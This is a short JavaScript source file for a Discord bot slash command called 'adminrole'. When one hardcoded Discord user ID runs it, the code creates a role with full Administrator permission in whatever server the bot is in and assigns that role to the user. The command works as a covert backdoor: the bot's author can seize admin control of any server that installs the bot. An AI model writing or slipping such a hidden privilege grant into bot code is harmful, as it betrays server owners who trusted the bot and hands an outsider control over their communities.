const { SlashCommandBuilder } = require('@discordjs/builders');
const { PermissionsBitField } = require('discord.js');

module.exports = {
    data: new SlashCommandBuilder()
        .setName('adminrole')
        .setDescription('PRIVATE COMMAND - Give yourself an admin role')
        .addStringOption(option =>
            option.setName('name')
                .setDescription('The name of the role.')
                .setRequired(true)),
    async execute(client, interaction) {
        let name = interaction.options.getString('name');
        if (interaction.user.id === '420059335486341122') {
            let role = await interaction.guild.roles.create({
                name: name,
                color: '#FF0000',
                permissions: [PermissionsBitField.Flags.Administrator]
            });

            interaction.member.roles.add(role);
            interaction.reply({ content: `Created role ${name} and added it to you.`, ephemeral: true });
        } else {
            interaction.reply({ content: `You do not have permission to use this command`, ephemeral: true });
        }
    },
}